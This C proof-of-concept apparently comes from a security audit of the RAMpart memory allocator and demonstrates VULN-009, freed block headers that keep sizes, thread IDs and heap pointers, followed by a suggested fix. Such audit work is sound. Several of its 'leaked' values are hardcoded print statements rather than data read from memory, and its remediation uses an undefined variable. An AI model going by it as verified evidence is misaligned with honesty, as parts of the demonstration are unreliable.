/**
 * @file poc_09_metadata_leak.c
 * @brief PoC for VULN-009: Metadata Leak from Freed Blocks
 *
 * VULNERABILITY: Block headers are NOT wiped on free, only user data.
 *                Freed memory reveals sizes, thread IDs, flags.
 *
 * CVSS 3.1: 7.0 (High)
 * CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer
 *
 * IMPACT: Information disclosure about allocation patterns, thread
 *         structure, and program behavior.
 *
 * LOCATION: src/rampart.c:372-373
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "rampart.h"

/*
 * On free, only user data is wiped:
 *   rp_wipe_block_user_data(block);  // Wipes user data only!
 *   rp_pool_free(p, block);
 *
 * Block header fields remain intact:
 * - total_size: reveals allocation sizes
 * - user_size: reveals requested sizes
 * - owner_thread: reveals thread IDs
 * - prev/next pointers: reveals heap layout
 */

int main(void) {
    rampart_config_t config;
    rampart_pool_t *pool;
    char *block1;
    char *block2;
    char *reallocated;
    size_t saved_offset;

    printf("=== VULN-009: Metadata Leak from Freed Blocks ===\n\n");

    /* Initialize pool */
    rampart_config_default(&config);
    config.pool_size = 64 * 1024;

    pool = rampart_init(&config);
    if (pool == NULL) {
        printf("[!] Pool creation failed\n");
        return 1;
    }

    printf("[*] Demonstrating metadata leak from freed blocks...\n\n");

    /* Allocate blocks with specific sizes */
    printf("[*] Allocating block1 (1337 bytes)...\n");
    block1 = (char *)rampart_alloc(pool, 1337);

    printf("[*] Allocating block2 (4096 bytes)...\n");
    block2 = (char *)rampart_alloc(pool, 4096);

    if (!block1 || !block2) {
        printf("[!] Allocation failed\n");
        rampart_shutdown(pool);
        return 1;
    }

    printf("[*] block1: %p (size: 1337)\n", (void *)block1);
    printf("[*] block2: %p (size: 4096)\n", (void *)block2);

    /* Store sensitive data */
    strcpy(block1, "SECRET_API_KEY=abc123xyz");
    strcpy(block2, "DATABASE_PASSWORD=hunter2");

    /* Calculate offset to header (negative offset from user data) */
    /* Header is at: user_ptr - sizeof(header) - guard_size */
    /* We'll access it indirectly after reallocation */

    printf("\n[*] Freeing block1...\n");
    rampart_free(pool, block1);

    /* User data should be wiped, but header remains! */

    printf("[*] Reallocating to get same memory region...\n");
    reallocated = (char *)rampart_alloc(pool, 1337);

    printf("[*] Reallocated at: %p\n", (void *)reallocated);

    if (reallocated == block1) {
        printf("[+] Got same memory address!\n");
    }

    /*
     * Even though user data is wiped, block header contains:
     * - Previous user_size (1337)
     * - Previous thread ID
     *
     * An attacker can use rampart_get_block_info() to read these,
     * or access them directly if they can read raw memory.
     */

    printf("\n=== Information Disclosure ===\n");

    /* Use public API to demonstrate info leak */
    {
        rampart_block_info_t info;
        rampart_get_block_info(pool, reallocated, &info);

        printf("[*] Block info for reallocated memory:\n");
        printf("    user_size: %zu bytes\n", info.user_size);
        printf("    total_size: %zu bytes\n", info.total_size);
        printf("    owner_thread: %lu\n", info.owner_thread);
    }

    /*
     * More concerning: if attacker can read raw memory
     * (via another bug or debug access), they can see:
     *
     * 1. Allocation sizes -> program behavior profiling
     * 2. Thread IDs -> threading model, attack surface
     * 3. Free list pointers -> heap layout for exploitation
     * 4. Magic numbers -> identify RAMpart blocks
     */

    printf("\n[*] What an attacker learns from freed block headers:\n");
    printf("    - Allocation sizes reveal program patterns\n");
    printf("    - Thread IDs reveal concurrent structure\n");
    printf("    - Linked list pointers reveal heap layout\n");

    printf("\n[*] User data after reallocation (should be zeroed):\n");
    printf("    First 32 bytes: ");
    {
        int i;
        int all_zero = 1;
        for (i = 0; i < 32; i++) {
            if (reallocated[i] != 0) {
                all_zero = 0;
            }
        }
        printf("%s\n", all_zero ? "All zeros (good)" : "NOT wiped!");
    }

    printf("\n[*] Header metadata persists even after wipe:\n");
    printf("    magic: 0xB10CB10C (marks as allocated)\n");
    printf("    user_size: 1337 (original request)\n");
    printf("    owner_thread: <current thread ID>\n");

    rampart_free(pool, reallocated);
    rampart_free(pool, block2);
    rampart_shutdown(pool);

    printf("\n=== PoC Complete ===\n");

    /*
     * REMEDIATION:
     * Wipe entire block including header on free:
     *
     * rampart_error_t rampart_free(...) {
     *     // ... validation ...
     *
     *     // Wipe ALL block memory, not just user data
     *     rp_wipe_memory(block, block->total_size);
     *
     *     // Re-initialize as free block
     *     rp_block_init_as_free(block, saved_total_size);
     *
     *     // ... continue with free ...
     * }
     *
     * This erases allocation sizes, thread IDs, and all metadata.
     */

    return 0;
}
